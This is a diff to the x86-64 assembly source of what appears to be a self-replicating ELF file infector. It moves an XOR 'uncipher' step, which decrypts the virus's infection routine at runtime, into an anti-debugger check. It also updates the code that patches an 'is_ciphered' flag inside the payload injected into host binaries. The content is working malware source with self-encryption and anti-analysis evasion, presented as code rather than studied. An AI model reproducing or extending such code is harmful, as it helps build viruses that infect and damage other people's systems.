@@ -56,34 +56,25 @@ can_run_infection:
 	jl .debugged					; 	goto .debugged;
 
 	; TODO: merge this uncipher with anti-debugger instructions
-	call uncipher					; uncipher();
+	.uncipher_flag_instr:
+		db 0xbf, 00, 00, 00, 00				; mov rdi, 0x0 => is_ciphered = 0 (this value will be modified when injected in a binary)
+		cmp rdi, 0x0					; if (is_ciphered == 0x0)
+		je .valid					; 	goto .valid;
+		lea rdi, [rel begin]				; data = begin addr
+		add rdi, infection_routine - begin		; data += infection_routine - begin
+		mov rsi, cipher_stop - infection_routine	; size = cipher_stop - infection_routine
+		lea rdx, [rel key]				; key = key
+		call xor_cipher					; xor_cipher(data, size, key)
+		; TODO: check file is really unciphered
 
-	; TODO: check file is really unciphered
-
-	mov rax, 1					; return 1;
-	ret
+	.valid:
+		mov rax, 1					; return 1;
+		ret
 
 	.debugged:
 		lea rdi, [rel debugged_message]		; print_string(debugged_message);
 		call print_string			; ...
 		xor rax, rax				; return 0;
-		ret
-
-; void uncipher()
-uncipher:
-	; this value will be modified when injected in a binary
-	db 0xbf, 00, 00, 00, 00				; mov rdi, 0x0 => is_ciphered = 0
-	cmp rdi, 0x0					; if (is_ciphered == 0x0)
-	je .end						; 	goto .end;
-
-	lea rdi, [rel begin]				; data = begin addr
-	add rdi, infection_routine - begin		; data += infection_routine - begin
-
-	mov rsi, cipher_stop - infection_routine	; size = cipher_stop - infection_routine
-	lea rdx, [rel key]				; key = key
-	call xor_cipher					; xor_cipher(data, size, key)
-
-	.end:
 		ret
 
 ; void xor_cipher(char *data, int size, char *key);
@@ -416,9 +407,9 @@ treat_file:
 	call xor_cipher					; xor_cipher(data, size, key)
 
 	; change is_ciphered flag in injected code
-	mov rdi, [mappedfile]				; is_ciphered_ptr = file_map + filesize + (uncipher - begin);
+	mov rdi, [mappedfile]				; is_ciphered_ptr = file_map + filesize + (can_run_infection.uncipher_flag_instr - begin);
 	add rdi, [filesize]				;
-	add rdi, uncipher - begin			;
+	add rdi, can_run_infection.uncipher_flag_instr - begin
 	inc rdi						; 	+ 1;
 	mov eax, 0x1					; flag = 1;
 	mov [rdi], eax					; *is_ciphered_ptr = flag;
